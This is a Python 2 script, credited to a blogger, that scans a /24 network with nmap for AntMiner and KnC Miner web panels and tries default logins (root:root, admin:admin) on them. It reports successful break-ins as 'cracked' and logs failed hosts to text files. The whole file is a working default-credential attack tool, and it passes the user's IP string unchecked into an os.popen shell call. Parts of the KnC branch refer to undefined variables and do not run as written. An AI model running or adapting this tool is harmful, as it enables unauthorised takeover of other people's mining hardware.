import os
import sys
import optparse
import httplib2




banner = """

 __   __  ___   __    _  _______  ______           _______  ______
|  |_|  ||   | |  |  | ||       ||    _ |         |       ||      |
|       ||   | |   |_| ||    ___||   | ||   ____  |    ___||  _    |
|       ||   | |       ||   |___ |   |_||_ |____| |   |___ | | |   |
|       ||   | |  _    ||    ___||    __  |       |    ___|| |_|   |
| ||_|| ||   | | | |   ||   |___ |   |  | |       |   |    |       |
|_|   |_||___| |_|  |__||_______||___|  |_|       |___|    |______|
====================================================================
WEB: http://d4master.blogspot.com                 CODED BY: DAMASTER
====================================================================

"""

commandList = optparse.OptionParser('usage: %prog --ip=127.0.0.1 | you can use any ip to scan range')
commandList.add_option('--ip', action="store",
                  help="ip of network to scan from 1 - 255",
                  )


options, remainder = commandList.parse_args()

# Check args
if not options.ip:
    print(banner)
    commandList.print_help()
    sys.exit(1)

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    OKRED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def ipRange(start_ip, end_ip):
   start = list(map(int, start_ip.split(".")))
   end = list(map(int, end_ip.split(".")))
   temp = start
   ip_range = []

   ip_range.append(start_ip)
   while temp != end:
      start[3] += 1
      for i in (3, 2, 1):
         if temp[i] == 256:
            temp[i] = 0
            temp[i-1] += 1
      ip_range.append(".".join(map(str, temp)))

   return ip_range

fixedip = ".".join(options.ip.split('.')[0:-1])

# sample usage
ip_range = ipRange("" + fixedip+ ".1", "" + fixedip+ ".255")

print banner

for ip_check in ip_range:
   scan_output = os.popen('nmap --script=http-headers ' + ip_check + ' -p 80').read()


   #print  scan_output

   if "antMiner Configuration" in scan_output:
       print bcolors.WARNING + "%s it's miner" % ip_check + bcolors.ENDC
       url = "http://%s" % ip_check
       ant_save_file = "ants.txt"
       ant_pass = "root:root"
       username = ant_pass.split(":")[0]
       password = ant_pass.split(":")[1]
       h = httplib2.Http(".cache")
       h.add_credentials(username, password) # Basic authentication
       resp, content = h.request(url)
       if resp.status == 200:
           print bcolors.OKRED + "cracked by :",username,password + bcolors.ENDC
           print bcolors.HEADER + "=========================" + bcolors.ENDC
       else:
           print bcolors.OKGREEN + "not cracked and saved in %s" % ant_save_file + bcolors.ENDC
           print bcolors.HEADER + "=========================" + bcolors.ENDC
           f = open(ant_save_file, 'a' )
           f.write(ip_check + '\n')
           f.close()

   elif "KnC Miner configuration" in scan_output:
           url = "http://%s" % ip_check
           knc_save_file = "knc.txt"
           knc_pass = "admin:admin"
           username = knc_pass.split(":")[0]
           password = knc_item.split(":")[1]
           h = httplib2.Http(".cache")
           h.add_credentials(username, password) # Basic authentication
           resp, content = h.request(url)
           if resp.status == 200:
               print bcolors.OKRED + "cracked by :",username,password + bcolors.ENDC
               print bcolors.HEADER + "=========================" + bcolors.ENDC
           else:
               print bcolors.OKGREEN + "not cracked and saved in %s" % knc_save_file + bcolors.ENDC
               print bcolors.HEADER + "=========================" + bcolors.ENDC
               f = open(kns_save_file, 'a' )
               f.write(ip_check + '\n')
               f.close()

   else:
       print "%s it't not miner" % ip_check
       print bcolors.HEADER + "=========================" + bcolors.ENDC